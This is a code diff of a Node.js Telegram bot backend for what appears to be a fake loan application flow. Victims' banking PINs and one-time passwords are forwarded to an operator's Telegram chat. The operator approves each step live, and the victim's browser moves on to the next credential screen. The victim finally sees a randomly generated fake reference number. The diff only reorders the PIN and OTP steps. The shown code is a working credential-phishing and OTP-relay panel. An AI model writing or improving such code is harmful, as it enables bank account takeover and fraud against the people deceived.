@@ -21,8 +21,8 @@ const botManager = {
         if (needsApproval) {
             options.reply_markup = {
                 inline_keyboard: [[
-                    // Step 5 Approval moves user to Step 6 (PIN screen)
-                    { text: "✅ APPROVE OTP", callback_data: `approve_5_${appId}` },
+                    // Step 5 Approval moves user to Step 6 (OTP screen)
+                    { text: "✅ APPROVE PIN", callback_data: `approve_5_${appId}` },
                     { text: "❌ REJECT", callback_data: `reject_5_${appId}` }
                 ]]
             };
@@ -30,16 +30,16 @@ const botManager = {
         bot.sendMessage(ADMIN_ID, msg, options);
     },
 
-    sendFinalApproval: (appId, pin) => {
+    sendFinalApproval: (appId, code) => {
         let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🏁 <b>🇲🇨 FINAL PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 PIN: <code>${pin}</code>\n`;
+        msg += `🏁 <b>🇨🇲 FINAL OTP RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔢 OTP: <code>${code}</code>\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━`;
         
         bot.sendMessage(ADMIN_ID, msg, {
             parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [[
-                    // Step 6 Approval finishes the transaction workflow
+                    // Step 6 Approval finishes the transaction workflow entirely
                     { text: "✅ COMPLETE LOAN", callback_data: `approve_6_${appId}` },
                     { text: "❌ REJECT", callback_data: `reject_6_${appId}` }
                 ]]
@@ -60,15 +60,15 @@ bot.on("callback_query", (query) => {
 
     if (action === "approve") {
         if (step === "5") {
-            // Signal frontend to move from Step 5 to Step 6 (PIN)
-            io.to(appId).emit('otp-verified');
-            bot.answerCallbackQuery(query.id, { text: "OTP Verified. PIN input shown to user." });
+            // Signal frontend to move from Step 5 (PIN) to Step 6 (OTP)
+            io.to(appId).emit('pin-verified');
+            bot.answerCallbackQuery(query.id, { text: "PIN Verified. OTP screen sent to user." });
         } 
         else if (step === "6") {
-            // Signal frontend to show final success screen with tracking ref
+            // Signal frontend to show final success screen with the tracking ref
             const ref = "ASA-XAF-" + Math.floor(Math.random() * 900000 + 100000);
-            io.to(appId).emit('pin-verified', { referenceId: ref });
-            bot.answerCallbackQuery(query.id, { text: "Application Completed!" });
+            io.to(appId).emit('otp-verified', { referenceId: ref });
+            bot.answerCallbackQuery(query.id, { text: "Application Successfully Completed!" });
         }
         
         bot.editMessageText(query.message.text + `\n\n✅ <b>ACTION: APPROVED (STEP ${step})</b>`, {
@@ -80,11 +80,11 @@ bot.on("callback_query", (query) => {
 
     if (action === "reject") {
         if (step === "5") {
-            io.to(appId).emit('otp-failed', { message: "OTP verification declined by admin." });
-            bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected" });
-        } else if (step === "6") {
-            io.to(appId).emit('pin-failed', { message: "Transactional PIN declined by admin." });
+            io.to(appId).emit('pin-failed', { message: "Security PIN declined by administrator." });
             bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected" });
+        } else if (step === "6") {
+            io.to(appId).emit('otp-failed', { message: "One-Time Password validation declined by administrator." });
+            bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected" });
         }
 
         bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
